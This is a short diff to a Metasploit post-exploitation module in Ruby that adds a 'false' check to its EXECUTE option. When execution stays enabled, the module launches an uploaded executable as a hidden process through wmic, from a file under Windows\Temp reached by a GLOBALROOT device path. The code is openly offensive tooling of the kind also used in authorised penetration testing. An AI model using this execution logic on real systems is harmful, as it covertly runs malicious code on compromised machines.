@@ -116,7 +116,12 @@ class Metasploit4 < Msf::Post
     if datastore["EXECUTE"].nil? or datastore["EXECUTE"].empty?
       print_status("Not Running .EXE")
     else
-      run_malware = session.sys.process.execute("cmd.exe /c %SYSTEMROOT%\\system32\\wbem\\wmic.exe process call create \\\\?\\GLOBALROOT\\Device\\#{volume_data_id}\\Windows\\Temp\\#{file_name}", nil, {'Hidden' => true})
+      if datastore["EXECUTE"] == "false"
+        print_status("Not Running .EXE")
+      else
+        print_good("Running uploaded Executable.")
+        run_malware = session.sys.process.execute("cmd.exe /c %SYSTEMROOT%\\system32\\wbem\\wmic.exe process call create \\\\?\\GLOBALROOT\\Device\\#{volume_data_id}\\Windows\\Temp\\#{file_name}", nil, {'Hidden' => true})
+      end        
     end
     #-----------------------------------------------------------------------------------------------------------------
     #Close Channel 
